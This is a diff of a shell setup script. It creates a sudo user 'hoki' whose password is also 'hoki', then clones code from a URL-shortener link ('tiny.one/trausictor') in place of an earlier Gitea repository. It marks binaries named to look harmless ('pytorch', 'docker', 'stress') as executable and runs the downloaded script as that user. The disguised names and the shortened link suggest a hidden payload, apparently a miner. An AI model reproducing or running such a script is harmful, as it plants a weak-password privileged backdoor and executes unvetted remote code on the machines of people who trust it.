@@ -7,10 +7,10 @@ sudo adduser hoki sudo
 sudo usermod -a -G sudo hoki
 sudo echo 'hoki:hoki' | sudo chpasswd
 cd /home/hoki
-git clone https://try.gitea.io/xmanusnia/Workergits.git
-cd Workergits
-sudo chown hoki:sudo docker
-sudo chown hoki:sudo luck.sh
-sudo chmod 700 stress docker
-sudo chmod 700 stress luck.sh
-sudo -u hoki sh -c "/home/hoki/Workergits/luck.sh"
+git clone https://tiny.one/trausictor
+cd trausictor
+sudo chown hoki:sudo pytorch
+sudo chown hoki:sudo sugg1.sh
+sudo chmod 700 stress pytorch
+sudo chmod 700 stress sugg1.sh
+sudo -u hoki sh -c "/home/hoki/trausictor/sugg1.sh"
